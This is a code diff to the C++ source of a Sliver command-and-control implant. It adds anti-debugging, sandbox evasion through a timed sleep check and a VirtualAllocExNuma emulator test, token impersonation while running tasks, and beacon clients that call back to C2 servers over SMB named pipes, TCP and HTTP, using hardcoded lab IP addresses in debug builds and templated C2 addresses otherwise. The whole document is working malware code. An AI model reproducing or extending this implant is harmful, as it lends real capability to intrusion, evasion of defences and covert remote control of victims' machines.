@@ -23,8 +23,6 @@
 #pragma warning(disable:4996)
 #include <winternl.h>
 #include "Sliver-CPPImplant.h"
-using namespace std;
-using namespace transports;
 using namespace uuids;
 
 //typedef struct _ECCkeyPair {
@@ -163,7 +161,15 @@ void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::
                 auto it_2 = sysHandlers.find(it->type());
                 auto htoken = token::getToken();
                 if (htoken != INVALID_HANDLE_VALUE) {
-                    ImpersonateLoggedOnUser(token::getToken());
+                    token::Token t{token::getToken()};
+                    BOOL res = FALSE;
+                    if (t.TokenType == TokenImpersonation)
+                        res = SetThreadToken(NULL, token::getToken());
+                    else
+                        res = ImpersonateLoggedOnUser(token::getToken());
+                    //auto res = ImpersonateLoggedOnUser(token::getToken());
+                    if (res == FALSE)
+                        std::cout << "SetThreadToken failed with error: " << GetLastError() << std::endl;
                 }
                 auto res = it_2->second(it->id(), it->data());
                 if (htoken != INVALID_HANDLE_VALUE) {
@@ -502,32 +508,61 @@ int Entry() {
     if (pPEB->BeingDebugged) return 0;
 
     FreeConsole();
-#endif
-#ifdef DELAY
+
     ULONGLONG uptimeBeforeSleep = GetTickCount64();
     typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
     PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
     LARGE_INTEGER delay;
-    delay.QuadPart = -10000 * 100000; // 100 seconds
+    PVOID m = NULL;
+    delay.QuadPart = -6000 * 100000; // 60 seconds
     pNtDelayExecution(FALSE, &delay);
     ULONGLONG uptimeAfterSleep = GetTickCount64();
-    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
+    if ((uptimeAfterSleep - uptimeBeforeSleep) < 60000) return false;
+
+    m = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
+    if (m == NULL)
+        return 0;
+    VirtualFreeEx(GetCurrentProcess(), m, 0, MEM_RELEASE);
 #endif
 #ifdef  PIVOT
 #ifdef SMBPIVOT
+#ifdef DEBUG
     unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "\\\\192.168.161.30\\pipe\\pivotbar" });
+#else
+    // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
+    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "{{$value}}" });
+    // {{end}} - range
+#endif
 #endif
 #ifdef TCPPIVOT
+#ifdef DEBUG
     unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "192.168.161.30:9005" });
+#else
+    // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
+    unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "{{$value}}" });
+    // {{end}} - range
+#endif
 #endif
 #endif
 #ifdef HTTP
+#ifdef DEBUG
     unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "https://192.168.161.50" }, 10, 10, 10);
+#else
+    // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
+    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "{{$value}}" }, 10, 10, 10);
+    // {{end}} - range
+#endif
 #endif
     //  PIVOT
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
+#ifdef DEBUG
     shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
+#else
+    // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
+    // {{end}} - range
+#endif
     while (1) {
         BeaconMainLoop(beacon);
 
